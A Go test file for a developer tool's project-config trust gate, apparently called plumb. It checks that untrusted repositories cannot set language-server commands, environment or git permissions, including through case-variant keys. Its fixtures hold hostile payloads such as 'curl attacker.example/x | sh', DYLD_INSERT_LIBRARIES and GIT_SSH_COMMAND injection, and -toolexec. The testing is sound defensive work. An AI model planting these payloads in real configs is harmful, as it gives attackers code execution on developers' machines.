package config

import (
	"os"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"testing"
)

// setProjectPolicyTrustForTest points LoadProject's trust lookup at store for the
// duration of the test, so no test ever reads or writes the real
// <DataDir>/trust.json. Mirrors newTrustStoreAt, the existing seam.
func setProjectPolicyTrustForTest(t *testing.T, store *TrustStore) {
	t.Helper()
	prev := projectPolicyTrust
	projectPolicyTrust = func() *TrustStore { return store }
	t.Cleanup(func() { projectPolicyTrust = prev })
}

// tempTrustStore returns a store backed by a fresh temp file and installs it as
// LoadProject's trust source.
func tempTrustStore(t *testing.T) *TrustStore {
	t.Helper()
	s := newTrustStoreAt(filepath.Join(t.TempDir(), "trust.json"))
	setProjectPolicyTrustForTest(t, s)
	return s
}

// hostileProjectConfig is the exploit payload from the lock-down fix, verbatim.
// Every trust test uses it, so a trusted-path regression cannot be hidden behind
// a gentler fixture.
const hostileProjectConfig = `
[lsp.go]
command = "/bin/sh"
args = ["-c", "curl attacker.example/x | sh"]
env = { DYLD_INSERT_LIBRARIES = "/tmp/evil.dylib" }
root_markers = ["README.md"]

[git]
allow_destructive = true
allow_push = true
protected_branches = []
`

// trustWorkspace records a trust grant for ws bound to whatever its project
// config currently asks for — the programmatic equivalent of `plumb trust`.
func trustWorkspace(t *testing.T, s *TrustStore, ws string) {
	t.Helper()
	spec, err := ProjectPolicySpecFor(ws)
	if err != nil {
		t.Fatalf("ProjectPolicySpecFor: %v", err)
	}
	if err := s.SetTrustedForProject(ws, nil, spec); err != nil {
		t.Fatalf("SetTrustedForProject: %v", err)
	}
}

// TestLoadProject_TrustedRootHonoursExecFields is the capability half of the
// trust boundary: a user who has approved this project's exact request gets it.
// The values asserted are the same ones the untrusted regression test proves are
// REFUSED, so the two together pin the boundary from both sides.
func TestLoadProject_TrustedRootHonoursExecFields(t *testing.T) {
	s := tempTrustStore(t)
	ws := projectConfigWorkspace(t, hostileProjectConfig)
	trustWorkspace(t, s, ws)

	merged, err := LoadProject(execBase(t), ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	got := merged.LSP["go"]
	if got.Command != "/bin/sh" {
		t.Errorf("trusted lsp.go.command = %q, want the project's /bin/sh", got.Command)
	}
	if !reflect.DeepEqual(got.Args, []string{"-c", "curl attacker.example/x | sh"}) {
		t.Errorf("trusted lsp.go.args = %v, want the project's argv", got.Args)
	}
	if got.Env["DYLD_INSERT_LIBRARIES"] != "/tmp/evil.dylib" {
		t.Errorf("trusted lsp.go.env = %v, want the project's environment", got.Env)
	}
	if !reflect.DeepEqual(got.RootMarkers, []string{"README.md"}) {
		t.Errorf("trusted lsp.go.root_markers = %v, want the project's markers", got.RootMarkers)
	}
	if !merged.Git.AllowDestructive || !merged.Git.AllowPush {
		t.Errorf("trusted [git] not honoured: %+v", merged.Git)
	}
	if len(merged.Git.ProtectedBranches) != 0 {
		t.Errorf("trusted git.protected_branches = %v, want the project's empty list", merged.Git.ProtectedBranches)
	}
}

// TestLoadProject_TrustedRootStillDropsUnknownLanguage pins that trust widens
// what a project may say about the user's OWN language servers and does not let
// it invent one: plumb has no adapter for a language the global config never
// declared, so such a table can only add an unbound argv.
func TestLoadProject_TrustedRootStillDropsUnknownLanguage(t *testing.T) {
	s := tempTrustStore(t)
	ws := projectConfigWorkspace(t, `
[lsp.evil]
command = "/bin/sh"
args = ["-c", "id > /tmp/pwned"]
enabled = true
`)
	trustWorkspace(t, s, ws)

	merged, err := LoadProject(execBase(t), ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	if _, ok := merged.LSP["evil"]; ok {
		t.Error("a trusted project config introduced a language server the global config does not define")
	}
}

// TestLoadProject_TrustIsBoundToContent is THE test the whole design exists for.
// Trust is recorded over one exact request; an agent (or anything else) that
// rewrites a trusted `command` afterwards must not have the new command honoured
// until the user re-approves. Without the content binding, `plumb trust` would be
// a permanent grant over whatever the file says next.
func TestLoadProject_TrustIsBoundToContent(t *testing.T) {
	s := tempTrustStore(t)
	ws := projectConfigWorkspace(t, `
[lsp.go]
command = "/opt/homebrew/bin/gopls"
`)
	trustWorkspace(t, s, ws)

	merged, err := LoadProject(execBase(t), ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	if merged.LSP["go"].Command != "/opt/homebrew/bin/gopls" {
		t.Fatalf("trusted command not honoured: %q", merged.LSP["go"].Command)
	}

	// The file is rewritten after the grant — the TOCTOU.
	writeProjectConfig(t, ws, `
[lsp.go]
command = "/bin/sh"
args = ["-c", "curl attacker.example/x | sh"]
`)
	merged, err = LoadProject(execBase(t), ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	want := execBase(t).LSP["go"]
	if merged.LSP["go"].Command != want.Command {
		t.Errorf("a command changed after `plumb trust` was honoured: got %q, want forced-to-base %q",
			merged.LSP["go"].Command, want.Command)
	}
	if !reflect.DeepEqual(merged.LSP["go"].Args, want.Args) {
		t.Errorf("args changed after `plumb trust` were honoured: got %v, want forced-to-base %v",
			merged.LSP["go"].Args, want.Args)
	}

	// Re-approving the NEW content restores the honour — trust is re-grantable,
	// not one-shot.
	trustWorkspace(t, s, ws)
	merged, err = LoadProject(execBase(t), ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	if merged.LSP["go"].Command != "/bin/sh" {
		t.Errorf("re-trust did not take effect: command = %q", merged.LSP["go"].Command)
	}
}

// TestLoadProject_TrustDoesNotLeakAcrossRoots verifies the grant is per absolute
// root: a second checkout of the same hostile config is untrusted even though an
// identically-shaped one was approved elsewhere.
func TestLoadProject_TrustDoesNotLeakAcrossRoots(t *testing.T) {
	s := tempTrustStore(t)
	trusted := projectConfigWorkspace(t, hostileProjectConfig)
	other := projectConfigWorkspace(t, hostileProjectConfig)
	trustWorkspace(t, s, trusted)

	merged, err := LoadProject(execBase(t), other)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	if merged.LSP["go"].Command != execBase(t).LSP["go"].Command {
		t.Errorf("trust leaked to another root: lsp.go.command = %q", merged.LSP["go"].Command)
	}
	if merged.Git.AllowPush {
		t.Error("trust leaked to another root: [git] network tier opened")
	}
}

// TestLoadProject_FailsClosedOnStoreFaults verifies every way the trust lookup can
// go wrong lands on "untrusted". A trust gate that fails open under a corrupt or
// unreadable store is not a trust gate.
func TestLoadProject_FailsClosedOnStoreFaults(t *testing.T) {
	base := execBase(t)
	wantCmd := base.LSP["go"].Command

	cases := []struct {
		name  string
		setup func(t *testing.T) *TrustStore
	}{
		{"absent record", func(t *testing.T) *TrustStore {
			t.Helper()
			return newTrustStoreAt(filepath.Join(t.TempDir(), "trust.json"))
		}},
		{"malformed store", func(t *testing.T) *TrustStore {
			t.Helper()
			p := filepath.Join(t.TempDir(), "trust.json")
			if err := os.WriteFile(p, []byte("{not json"), 0o600); err != nil {
				t.Fatal(err)
			}
			return newTrustStoreAt(p)
		}},
		{"unreadable store", func(t *testing.T) *TrustStore {
			t.Helper()
			// A directory where the file should be: ReadFile errors.
			p := filepath.Join(t.TempDir(), "trust.json")
			if err := os.MkdirAll(p, 0o755); err != nil {
				t.Fatal(err)
			}
			return newTrustStoreAt(p)
		}},
		{"record with no policy hash", func(t *testing.T) *TrustStore {
			t.Helper()
			s := newTrustStoreAt(filepath.Join(t.TempDir(), "trust.json"))
			// The coarse grant the TUI Commands tab writes must not carry the
			// capability grant with it.
			if err := s.SetTrusted(t.TempDir(), true); err != nil {
				t.Fatal(err)
			}
			return s
		}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			setProjectPolicyTrustForTest(t, tc.setup(t))
			ws := projectConfigWorkspace(t, hostileProjectConfig)
			merged, err := LoadProject(base, ws)
			if err != nil {
				t.Fatalf("LoadProject: %v", err)
			}
			if merged.LSP["go"].Command != wantCmd {
				t.Errorf("trust gate failed OPEN: lsp.go.command = %q, want %q", merged.LSP["go"].Command, wantCmd)
			}
			if merged.Git.AllowPush || merged.Git.AllowDestructive {
				t.Errorf("trust gate failed OPEN on [git]: %+v", merged.Git)
			}
		})
	}
}

// TestTrustStore_CoarseGrantIsNotPolicyTrust pins the separation directly: the
// coarse flag (set by a TUI Commands-tab workspace edit, "trusted by authorship")
// must never satisfy the capability gate, and granting the capability must not be
// undone by a later coarse re-grant.
func TestTrustStore_CoarseGrantIsNotPolicyTrust(t *testing.T) {
	s := newTrustStoreAt(filepath.Join(t.TempDir(), "trust.json"))
	root := t.TempDir()
	spec := ProjectPolicySpec{{Key: "lsp.go.command", Value: "/bin/sh"}}

	if err := s.SetTrusted(root, true); err != nil {
		t.Fatal(err)
	}
	if s.IsTrustedForPolicy(root, spec) {
		t.Error("a coarse grant must not satisfy the capability gate")
	}
	if err := s.SetTrustedForProject(root, nil, spec); err != nil {
		t.Fatal(err)
	}
	if !s.IsTrustedForPolicy(root, spec) {
		t.Fatal("SetTrustedForProject did not record the capability grant")
	}
	if err := s.SetTrusted(root, true); err != nil {
		t.Fatal(err)
	}
	if !s.IsTrustedForPolicy(root, spec) {
		t.Error("a coarse re-grant must preserve the capability binding")
	}
	// Revoking clears everything for the root.
	if err := s.SetTrusted(root, false); err != nil {
		t.Fatal(err)
	}
	if s.IsTrustedForPolicy(root, spec) {
		t.Error("revoking trust must clear the capability binding")
	}
}

// TestProjectPolicySpec_ExtractsOnlyCapabilityKeys pins what needs trust and what
// does not. Over-collecting is a real cost: every key in the spec is one more
// thing whose edit invalidates the grant, and one more thing a user is asked to
// approve.
func TestProjectPolicySpec_ExtractsOnlyCapabilityKeys(t *testing.T) {
	ws := projectConfigWorkspace(t, `
[edits]
strict = true

[lsp.go]
command = "gopls"
enabled = false
diagnostics = "pull"
idle_timeout = "5m"

[lsp.html]
root_markers = ["index.html"]

[git]
commit_trailer = true

[tasks.go]
test = "go test ./..."
`)
	spec, err := ProjectPolicySpecFor(ws)
	if err != nil {
		t.Fatalf("ProjectPolicySpecFor: %v", err)
	}
	want := []string{"git.commit_trailer", "lsp.go.command", "lsp.html.root_markers"}
	if !reflect.DeepEqual(spec.Keys(), want) {
		t.Errorf("spec keys = %v, want %v (sorted, capability-granting only)", spec.Keys(), want)
	}
}

// foldVariantConfig is reproduction A: `Command`/`Args` decode into LSPConfig
// through go-toml/v2's case-insensitive tag matching, while a benign [git] key
// supplies the entire visible disclosure.
const foldVariantConfig = `
[git]
commit_trailer = true

[lsp.go]
Command = "/bin/sh"
Args = ["-c", "curl attacker.example/x | sh"]
`

// TestLoadProject_FoldVariantExecKeysAreGated is the regression for the
// fold-variant hole. Extraction used to look each gated field up by its exact
// canonical name, so `Command` was absent from the spec — and therefore from the
// hash, from `plumb trust`'s disclosure, from doctor and from `config show` —
// while still reaching exec.CommandContext. A repository could ship a
// disclosure that showed only `git.commit_trailer = true` and be executed on
// attach.
func TestLoadProject_FoldVariantExecKeysAreGated(t *testing.T) {
	tempTrustStore(t)
	ws := projectConfigWorkspace(t, foldVariantConfig)

	spec, err := ProjectPolicySpecFor(ws)
	if err != nil {
		t.Fatalf("ProjectPolicySpecFor: %v", err)
	}
	if !spec.IsEmpty() && len(spec) < 3 {
		t.Fatalf("spec = %v, want the fold variants captured alongside git.commit_trailer", spec.Keys())
	}
	for _, want := range []string{"lsp.go.Command", "lsp.go.Args"} {
		if !slices.Contains(spec.Keys(), want) {
			t.Errorf("%s missing from the spec — it decodes into LSPConfig and must be gated, disclosed and hashed", want)
		}
	}
	// Untrusted, so the argv must not survive the merge.
	base := execBase(t)
	merged, err := LoadProject(base, ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	if merged.LSP["go"].Command != base.LSP["go"].Command {
		t.Errorf("fold-variant Command reached the resolved config: %q", merged.LSP["go"].Command)
	}
	if !reflect.DeepEqual(merged.LSP["go"].Args, base.LSP["go"].Args) {
		t.Errorf("fold-variant Args reached the resolved config: %v", merged.LSP["go"].Args)
	}
	// The disclosure surfaces must show them, values and all.
	st, err := ProjectPolicyStatusFor(ws)
	if err != nil {
		t.Fatalf("ProjectPolicyStatusFor: %v", err)
	}
	if !st.NeedsTrust() {
		t.Fatal("a config setting Command must report as needing trust")
	}
	described := strings.Join(st.Spec.Describe(), "\n")
	if !strings.Contains(described, "/bin/sh") || !strings.Contains(described, "curl attacker.example") {
		t.Errorf("disclosure %q must show the argv the project asked for", described)
	}
	// config show asks with the canonical spelling; the spec holds the project's.
	if !st.Asked("lsp.go.command") {
		t.Error("Asked must be fold-insensitive, or config show annotates nothing for a variant spelling")
	}
	if e := findEntry(t, spec, "lsp.go.Command"); e.Warning(warnBase()) == "" {
		t.Error("a fold-variant command must warn at trust time")
	}
}

// TestLoadProject_TrustDoesNotSurviveAddedFoldVariant is reproduction B, and the
// sharper of the two: trust a project whose only gated key is innocuous, then ADD
// a fold variant of an exec field. If the spec cannot see the new key, the hash
// is unchanged, the grant stays valid, there is no re-prompt, and the new argv is
// honoured — the exact TOCTOU the content binding exists to close, walked around
// rather than broken.
func TestLoadProject_TrustDoesNotSurviveAddedFoldVariant(t *testing.T) {
	s := tempTrustStore(t)
	base := execBase(t)
	ws := projectConfigWorkspace(t, "[lsp.go]\nroot_markers = [\"go.mod\"]\n")
	trustWorkspace(t, s, ws)

	merged, err := LoadProject(base, ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	if !reflect.DeepEqual(merged.LSP["go"].RootMarkers, []string{"go.mod"}) {
		t.Fatalf("the innocuous trusted key is not in effect: %v", merged.LSP["go"].RootMarkers)
	}

	// The escalation: a fold-variant exec key appears after the grant.
	writeProjectConfig(t, ws, "[lsp.go]\nroot_markers = [\"go.mod\"]\nCOMMAND = \"/bin/sh\"\n")
	merged, err = LoadProject(base, ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	if merged.LSP["go"].Command != base.LSP["go"].Command {
		t.Fatalf("a COMMAND added AFTER `plumb trust` was honoured with no re-prompt: %q",
			merged.LSP["go"].Command)
	}
	// The whole grant is invalidated, not just the new key — trust binds to the
	// request as a unit, so the previously-trusted marker falls back too until the
	// user re-approves what the file now says.
	if reflect.DeepEqual(merged.LSP["go"].RootMarkers, []string{"go.mod"}) {
		t.Error("the grant should be invalidated wholesale by the added key")
	}
	st, err := ProjectPolicyStatusFor(ws)
	if err != nil {
		t.Fatalf("ProjectPolicyStatusFor: %v", err)
	}
	if !st.NeedsTrust() {
		t.Error("the escalated config must report as needing trust again")
	}
}

// findEntry returns the spec entry with the given exact key.
func findEntry(t *testing.T, spec ProjectPolicySpec, key string) PolicyEntry {
	t.Helper()
	for _, e := range spec {
		if e.Key == key {
			return e
		}
	}
	t.Fatalf("no entry %q in %v", key, spec.Keys())
	return PolicyEntry{}
}

// TestProjectPolicySpec_UnknownLSPKeyIsGated pins the allow-list direction: a key
// an [lsp.<lang>] table holds that is not one of the four provably inert fields
// is gated, whatever it is. Over-gating an inert key costs a re-trust;
// under-gating one cost arbitrary code execution.
func TestProjectPolicySpec_UnknownLSPKeyIsGated(t *testing.T) {
	ws := projectConfigWorkspace(t, `
[lsp.go]
enabled = false
diagnostics = "pull"
idle_timeout = "5m"
max_workspaces = 3
Enabled_But_Odd = 1
`)
	spec, err := ProjectPolicySpecFor(ws)
	if err != nil {
		t.Fatalf("ProjectPolicySpecFor: %v", err)
	}
	if !reflect.DeepEqual(spec.Keys(), []string{"lsp.go.Enabled_But_Odd"}) {
		t.Errorf("spec keys = %v, want only the unrecognised key gated", spec.Keys())
	}
}

// TestProjectPolicySpec_FoldVariantsBothCaptured verifies two spellings of one
// field cannot mask one another: both are present, both are hashed, so removing
// either changes the grant.
func TestProjectPolicySpec_FoldVariantsBothCaptured(t *testing.T) {
	both := projectPolicySpecFrom(map[string]any{
		"lsp": map[string]any{"go": map[string]any{"command": "a", "Command": "b"}},
	})
	if len(both) != 2 {
		t.Fatalf("spec = %v, want both spellings", both.Keys())
	}
	one := projectPolicySpecFrom(map[string]any{
		"lsp": map[string]any{"go": map[string]any{"command": "a"}},
	})
	if canonicalPolicyHash(both) == canonicalPolicyHash(one) {
		t.Error("dropping a spelling must change the hash")
	}
}

// TestProjectPolicySpec_EmptyWhenNothingGranted covers the "behaves exactly as
// today" case: a project that sets only benign keys triggers no trust lookup, no
// prompt, and no notice.
func TestProjectPolicySpec_EmptyWhenNothingGranted(t *testing.T) {
	// A trust store that would panic if consulted proves LoadProject does not
	// look trust up when there is nothing to trust.
	setProjectPolicyTrustForTest(t, newTrustStoreAt(filepath.Join(t.TempDir(), "nope.json")))
	ws := projectConfigWorkspace(t, `
[edits]
rate_limit_per_minute = 7

[lsp.go]
diagnostics = "pull"
`)
	spec, err := ProjectPolicySpecFor(ws)
	if err != nil {
		t.Fatalf("ProjectPolicySpecFor: %v", err)
	}
	if !spec.IsEmpty() {
		t.Fatalf("spec = %v, want empty", spec.Keys())
	}
	merged, err := LoadProject(execBase(t), ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	if merged.Edits.RateLimitPerMinute != 7 || merged.LSP["go"].Diagnostics != "pull" {
		t.Error("benign project overrides lost")
	}
}

// TestProjectPolicyStatus_ReportsRequestAndTrust covers the shape every
// visibility surface renders.
func TestProjectPolicyStatus_ReportsRequestAndTrust(t *testing.T) {
	s := tempTrustStore(t)
	ws := projectConfigWorkspace(t, "[lsp.html]\nroot_markers = ['index.html']\n")

	st, err := ProjectPolicyStatusFor(ws)
	if err != nil {
		t.Fatalf("ProjectPolicyStatusFor: %v", err)
	}
	if st.InEffect() || !st.NeedsTrust() {
		t.Error("an untrusted request must report as not in effect")
	}
	if !st.Asked("lsp.html.root_markers") || st.Asked("lsp.go.command") {
		t.Errorf("Asked wrong: %v", st.Spec.Keys())
	}
	if got, want := st.Spec.Describe(), []string{`lsp.html.root_markers = ["index.html"]`}; !reflect.DeepEqual(got, want) {
		t.Errorf("Describe = %v, want %v (values, not just keys)", got, want)
	}

	trustWorkspace(t, s, ws)
	st, err = ProjectPolicyStatusFor(ws)
	if err != nil {
		t.Fatalf("ProjectPolicyStatusFor: %v", err)
	}
	if !st.InEffect() || st.NeedsTrust() {
		t.Error("a trusted request must report as in effect")
	}
}

// warnBase is a global config whose protected-branch list is the shipped
// default, so a project list can be judged against something concrete.
func warnBase() Config {
	base := Defaults()
	base.Git.ProtectedBranches = []string{"main", "master"}
	return base
}

// TestPolicyEntry_WarnsOnExecutionAndTiers pins that the keys which are execution
// or a tier grant carry a warning at `plumb trust` time, and that an inert value
// does not manufacture one.
//
// The fold-variant rows are the regression: go-toml/v2 matches a TOML key to a
// struct tag case-insensitively, so `[git] Allow_Push` really does open the
// network tier — and an exact `switch e.Key` printed it with no warning beside
// it, which is a disclosure that reads as safe while granting the opposite.
func TestPolicyEntry_WarnsOnExecutionAndTiers(t *testing.T) {
	warns := []PolicyEntry{
		{Key: "lsp.go.command", Value: "/bin/sh"},
		{Key: "lsp.go.args", Value: []any{"-c", "id"}},
		{Key: "lsp.go.env", Value: map[string]any{"PATH": "/tmp/evil"}},
		{Key: "lsp.zig.initialization_options", Value: map[string]any{"enable_build_on_save": true}},
		{Key: "lsp.html.root_markers", Value: []any{"index.html"}},
		{Key: "git.allow_destructive", Value: true},
		{Key: "git.allow_push", Value: true},
		{Key: "git.protected_branches", Value: []any{}},
		// Fold variants: every one of these decodes.
		{Key: "lsp.go.Command", Value: "/bin/sh"},
		{Key: "lsp.go.COMMAND", Value: "/bin/sh"},
		{Key: "lsp.go.Root_Markers", Value: []any{"README.md"}},
		{Key: "git.Allow_Push", Value: true},
		{Key: "git.ALLOW_DESTRUCTIVE", Value: true},
		// An unrecognised [lsp.*] key is gated, so it must explain itself too.
		{Key: "lsp.go.somethingNew", Value: "x"},
		// A non-empty list that still drops a protected branch.
		{Key: "git.protected_branches", Value: []any{"placeholder"}},
		{Key: "git.protected_branches", Value: []any{"main"}},
	}
	for _, e := range warns {
		if e.Warning(warnBase()) == "" {
			t.Errorf("%s = %v must carry a warning at trust time", e.Key, e.Value)
		}
	}
	quiet := []PolicyEntry{
		{Key: "git.allow_push", Value: false},
		{Key: "git.commit_trailer", Value: true},
		{Key: "git.protected_branches", Value: []any{"main", "master"}},
		{Key: "git.protected_branches", Value: []any{"master", "main", "release"}},
	}
	for _, e := range quiet {
		if w := e.Warning(warnBase()); w != "" {
			t.Errorf("%s = %v should not warn, got %q", e.Key, e.Value, w)
		}
	}
}

// TestDroppedBranchWarning_NamesWhatIsLost pins MEDIUM-3's substance: the list is
// the complete protected set, so any project-supplied value that omits a branch
// the global config protects unprotects it — `["placeholder"]` exactly as much as
// `[]`, while looking considered.
func TestDroppedBranchWarning_NamesWhatIsLost(t *testing.T) {
	e := PolicyEntry{Key: "git.protected_branches", Value: []any{"placeholder"}}
	w := e.Warning(warnBase())
	for _, want := range []string{"main", "master"} {
		if !strings.Contains(w, want) {
			t.Errorf("warning %q must name the dropped branch %q", w, want)
		}
	}
}

// TestLoadProject_GitEnvNeedsTrust pins the [git] env trust boundary. The git
// child's environment is a code-execution channel — GIT_SSH_COMMAND names a
// command git runs on every fetch and push — and a cloned repository ships
// .plumb/config.toml, so an untrusted project must not be able to set it. The
// knob lives inside [git] precisely so forceCapabilityFieldsToBase's whole-block
// reset covers it; this test is what proves that reasoning holds in code rather
// than only in the comment.
func TestLoadProject_GitEnvNeedsTrust(t *testing.T) {
	const payload = `
[git]
env = { GIT_SSH_COMMAND = "sh -c 'curl attacker.example/x | sh'", GOFLAGS = "-toolexec=/tmp/evil" }
`
	ws := t.TempDir()
	plumbDir := filepath.Join(ws, ".plumb")
	if err := os.MkdirAll(plumbDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(plumbDir, "config.toml"), []byte(payload), 0o644); err != nil {
		t.Fatal(err)
	}
	store := tempTrustStore(t)

	// 1. Untrusted: the request is forced back, so nothing of it survives.
	got, err := LoadProject(defaults, ws)
	if err != nil {
		t.Fatalf("LoadProject: %v", err)
	}
	if len(got.Git.Env) != 0 {
		t.Errorf("an untrusted project config must not set the git child environment, got %v", got.Git.Env)
	}

	// 2. It is nonetheless DISCLOSED, so `plumb trust` shows what is being asked
	//    for. A key that is silently dropped is the same defect in the other
	//    direction: it would let a trusted repo add this key later without
	//    invalidating the grant.
	spec, err := ProjectPolicySpecFor(ws)
	if err != nil {
		t.Fatalf("ProjectPolicySpecFor: %v", err)
	}
	var entry *PolicyEntry
	for i := range spec {
		if strings.EqualFold(spec[i].Key, "git.env") {
			entry = &spec[i]
		}
	}
	if entry == nil {
		t.Fatalf("git.env must appear in the trust spec, got keys %v", spec.Keys())
	}
	if w := entry.Warning(defaults); w == "" {
		t.Error("git.env must carry a warning at trust time — no value of it is safe to wave through")
	}
	if desc := strings.Join(spec.Describe(), "\n"); !strings.Contains(desc, "GIT_SSH_COMMAND") {
		t.Errorf("the disclosure must show the VALUES being asked for, got %q", desc)
	}

	// 3. Trusted for this exact content: honoured.
	trustWorkspace(t, store, ws)
	got, err = LoadProject(defaults, ws)
	if err != nil {
		t.Fatalf("LoadProject (trusted): %v", err)
	}
	if got.Git.Env["GOFLAGS"] != "-toolexec=/tmp/evil" {
		t.Errorf("a trusted project config should set the git child environment, got %v", got.Git.Env)
	}
}

// TestLoadProject_GitEnvCannotPoisonBase is the ALIASING half of that boundary,
// and it exists because go-toml/v2 does NOT treat every spelling of a key alike
// when it unmarshals into a PRE-POPULATED map. Under `[git]`, an inline
// `env = { X = "y" }` REPLACES the map; the `[git.env]` sub-table and the
// `git.env.X` dotted key MERGE INTO the one already there.
//
// LoadProjectWithPolicy unmarshals into cloneConfig(base), so the map the two
// merging spellings write into is base's own unless cloneConfig copies Git.Env.
// If it does not, an untrusted project's variables land directly in the
// caller's live base config — the daemon's — and forceCapabilityFieldsToBase
// then forces merged.Git back to a base that is ALREADY poisoned, returning a
// clean-looking config while every later load in the process carries the
// payload. A test that inspected only the return value would pass throughout,
// which is why base is asserted on here.
//
// TestLoadProject_GitEnvNeedsTrust above uses the inline form — the single
// spelling that replaces rather than merges — so it cannot see this.
func TestLoadProject_GitEnvCannotPoisonBase(t *testing.T) {
	for _, tc := range []struct{ name, payload string }{
		{"inline table", "[git]\nenv = { GIT_SSH_COMMAND = \"sh -c 'curl attacker.example/x | sh'\" }\n"},
		{"sub-table", "[git.env]\nGIT_SSH_COMMAND = \"sh -c 'curl attacker.example/x | sh'\"\n"},
		{"dotted key", "git.env.GIT_SSH_COMMAND = \"sh -c 'curl attacker.example/x | sh'\"\n"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			ws := t.TempDir()
			writeProjectConfig(t, ws, tc.payload)
			tempTrustStore(t) // a fresh store: ws is UNTRUSTED

			base := Defaults()
			base.Git.Env = map[string]string{"GOWORK": "off"}

			got, err := LoadProject(base, ws)
			if err != nil {
				t.Fatalf("LoadProject: %v", err)
			}
			if v, ok := got.Git.Env["GIT_SSH_COMMAND"]; ok {
				t.Errorf("an untrusted project set the git child environment: GIT_SSH_COMMAND=%q", v)
			}
			if v, ok := base.Git.Env["GIT_SSH_COMMAND"]; ok {
				t.Errorf("the untrusted project config wrote into the CALLER's base config: base.Git.Env[GIT_SSH_COMMAND]=%q — the trust gate is bypassed for every later load in this process", v)
			}
			if !reflect.DeepEqual(base.Git.Env, map[string]string{"GOWORK": "off"}) {
				t.Errorf("loading a project must not touch the caller's base env at all, got %v", base.Git.Env)
			}
		})
	}
}

// TestForceCapabilityFieldsToBase_ClonesGitEnv guards the aliasing hazard the
// whole-struct `merged.Git = base.Git` assignment introduces once [git] holds a
// map: LoadProject's caller usually keeps base in a live config store, so a
// shared map would let one project's merged view mutate every other's.
func TestForceCapabilityFieldsToBase_ClonesGitEnv(t *testing.T) {
	base := Defaults()
	base.Git.Env = map[string]string{"GOWORK": "off"}
	merged := Defaults()

	forceCapabilityFieldsToBase(base, &merged)

	if merged.Git.Env["GOWORK"] != "off" {
		t.Fatalf("the forced-back env should be base's, got %v", merged.Git.Env)
	}
	merged.Git.Env["GOWORK"] = "mutated"
	if base.Git.Env["GOWORK"] != "off" {
		t.Error("the forced-back env must not share backing storage with base")
	}
}

// TestValidateGit_RejectsUnusableEnvNames pins that a name which cannot survive
// the trip into a KEY=VALUE environment slice is refused at load, rather than
// silently landing the value on a different variable than the one written.
func TestValidateGit_RejectsUnusableEnvNames(t *testing.T) {
	cases := map[string]map[string]string{
		"empty name":     {"": "x"},
		"name with =":    {"A=B": "x"},
		"name with NUL":  {"A\x00B": "x"},
		"value with NUL": {"A": "x\x00y"},
	}
	for name, env := range cases {
		t.Run(name, func(t *testing.T) {
			cfg := Defaults()
			cfg.Git.Env = env
			if err := validate(cfg); err == nil {
				t.Errorf("validate must reject %q", env)
			}
		})
	}
	ok := Defaults()
	ok.Git.Env = map[string]string{"GOWORK": "off", "EMPTY": ""}
	if err := validate(ok); err != nil {
		t.Errorf("a well-formed env must validate, got %v", err)
	}
}
